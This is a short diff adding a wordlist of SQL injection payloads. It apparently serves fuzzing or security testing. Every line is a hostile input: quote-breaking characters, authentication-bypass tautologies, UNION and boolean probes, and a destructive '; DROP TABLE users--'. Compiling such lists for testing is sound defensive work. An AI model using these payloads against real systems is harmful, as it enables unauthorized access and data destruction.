@@ -1,0 +1,28 @@
+'
+''
+`
+``
+,
+"
+""
+/
+//
+\
+\\
+;
+' or '1'='1
+' or '1'='1'--
+' or '1'='1'/*
+') or ('1'='1
+' OR 1=1--
+" OR 1=1--
+OR 1=1--
+' OR 'x'='x
+'; DROP TABLE users--
+1; SELECT * FROM users
+' UNION SELECT null--
+' UNION SELECT null,null--
+' AND 1=0--
+' AND 1=1--
+1' AND '1'='1
+admin'--
